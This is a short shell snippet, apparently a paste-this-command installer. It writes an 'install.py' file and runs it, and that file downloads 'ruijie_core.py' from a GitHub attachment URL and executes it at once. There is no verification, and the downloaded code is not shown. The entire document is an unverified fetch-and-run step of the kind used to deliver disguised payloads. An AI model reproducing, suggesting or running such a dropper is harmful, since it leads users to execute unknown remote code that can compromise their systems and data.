python - << 'PY'
code = '''import sys
import urllib.request
import subprocess

CORE_URL = "https://github.com/user-attachments/files/27424783/ruijie_core.py"
CORE_FILE = "ruijie_core.py"

def main():
try:
print("[*] Downloading core...")
urllib.request.urlretrieve(CORE_URL, CORE_FILE)
print("[+] Download complete")
print("[*] Running...")
subprocess.run([sys.executable, CORE_FILE], check=True)
except Exception as e:
print(f"[!] Error: {e}")

if __name__ == "__main__":
main()
'''
open("install.py","w").write(code)
print("install.py written ✅")
PY

python install.py
